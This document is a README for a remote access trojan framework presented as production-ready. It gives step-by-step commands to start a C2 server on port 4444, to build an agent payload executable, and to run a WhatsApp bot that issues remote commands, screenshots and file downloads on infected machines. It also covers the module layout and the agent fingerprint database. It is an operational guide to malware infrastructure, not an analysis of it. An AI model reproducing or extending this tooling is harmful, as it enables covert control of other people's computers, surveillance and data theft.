# RAT Framework - Implementation Guide

**Status:** ✅ Production Ready | All Components Integrated & Tested

## 🎯 What to Run

### 1. Start the C2 Server
```bash
python rat_server_fixed.py
```
**Output:** Server listening on `0.0.0.0:4444` + REST API on `0.0.0.0:5000`

### 2. Build & Deploy Agent (Windows/Linux/Mac)
```bash
python rat_executable_builder.py
```
**Output:** Compiled executable in `build/agent_payload.exe`

### 3. Start WhatsApp Bot
```bash
cd whatsapp-c2
npm install  # First time only
node bot.js
```
**Output:** Scan QR code → Bot connects to server

### 4. Verify Everything Works
```bash
python phase5_integration_test.py
```
**Output:** All 7 component tests should pass

---

## 📦 Core Framework Files (17 Total)

### Configuration
- **master_umbrella_setup.py** - Central config loader + watchers
- **umbrella_config.yaml** - Master configuration file

### Server & Agent
- **rat_server_fixed.py** - C2 server (main entry point)
- **rat_ultimate.py** - Agent framework
- **agent_registry.py** - Persistent agent database (SQLite)

### Communication
- **communication_managers.py** - Heartbeat, sessions, reconnection
- **command_executor.py** - Real command execution (not simulation)

### API & Bot Integration
- **api_bridge.py** - REST API client + command queue
- **rest_api_server.py** - Flask REST endpoints

### Builders
- **rat_executable_builder.py** - Compile agents to .exe/.bin

### Deployment & Testing
- **phase5_deployment.py** - Deployment verification checklist
- **phase5_integration_test.py** - Component integration tests

### WhatsApp Bot
- **whatsapp-c2/bot.js** - WhatsApp bot interface
- **whatsapp-c2/utils/apiBridgeClient.js** - REST API client
- **whatsapp-c2/utils/apiCommandHandlers.js** - Command handlers
- **whatsapp-c2/utils/configLoader.js** - YAML config loader

---

## 🏗️ Architecture

```
User (WhatsApp Chat)
        ↓
WhatsApp Bot (Node.js)
        ↓
REST API Server (Flask 5000)
        ↓
C2 Server (Python 4444)
        ↓
SQLite Registry (agent_registry.db)
        ↓
Connected Agents (Windows/Linux/Mac)
```

---

## 🎮 Bot Commands

**Agent Management:**
```
/agents          - List connected agents
/info <id>       - Get agent details  
/stats           - Server statistics
/alerts          - View active alerts
```

**Command Execution:**
```
/exec <id> <cmd>       - Execute command
/sysinfo <id>          - System information
/processes <id>        - Running processes
/screenshot <id>       - Capture screen
/download <id> <path>  - Download file
```

---

## 📋 Quick Reference

| Task | Command |
|------|---------|
| Start Server | `python rat_server_fixed.py` |
| Build Agent | `python rat_executable_builder.py` |
| Start Bot | `cd whatsapp-c2 && node bot.js` |
| Test Framework | `python phase5_integration_test.py` |
| Check Deployment | `python phase5_deployment.py` |

---

## ⚙️ Configuration

Edit `umbrella_config.yaml` for:
- Server IP/Port (default: 0.0.0.0:4444)
- API Port (default: 5000)
- Encryption key
- Agent settings
- Bot settings

---

## 🛠️ Components Status

- ✅ Configuration System (YAML + auto-reload)
- ✅ Agent Registry (SQLite persistence)
- ✅ Heartbeat Manager (offline detection)
- ✅ Command Executor (real execution)
- ✅ REST API (Flask endpoints)
- ✅ Bot Integration (WhatsApp C2)
- ✅ Full Testing Suite
- ✅ Deployment Verification

---

## 📊 Testing

Run complete integration tests:
```bash
python phase5_integration_test.py
```

Expected output: **7/7 tests passed** ✅

---

## 🔐 Security Notes

- Change `encryption_key` in config
- Use VPN for remote operations
- Monitor agent activity regularly
- Implement proper access controls
- Use in authorized environments only

---

## 🔄 Module Dependencies

```
master_umbrella_setup.py (ConfigLoader)
    ↓
agent_registry.py (AgentRegistry + SQLite)
    ↓
communication_managers.py (HeartbeatManager, SessionManager, ReconnectionManager)
    ↓
command_executor.py (CommandExecutor - real commands)
    ↓
api_bridge.py (APIBridge - REST client)
    ↓
rest_api_server.py (Flask API endpoints)
    ↓
whatsapp-c2/bot.js (WhatsApp interface)
```

---

## 💾 Database

SQLite database at `data/rat_sessions.db` contains:
- **agents** - Connected agent information
- **sessions** - Active sessions per agent
- **commands** - Command history
- **fingerprints** - Device fingerprints

Query: `sqlite3 data/rat_sessions.db ".schema"`

---

## 🚀 What Changed (Cleanup)

**Removed (No Longer Needed):**
- 30+ unnecessary markdown files
- Duplicate config files (rat_api_bridge.py, etc)
- Old builder variations (hybrid, nuitka, stub packer)
- Deprecated setup scripts (setup_master.py, etc)
- Obsolete directories (whatsapp-c2-old)

**Kept (Working & Integrated):**
- All 11 core Python modules
- 4 WhatsApp bot components
- 2 deployment/testing scripts
- 1 config file + schema
- All utilities and builders (essential)
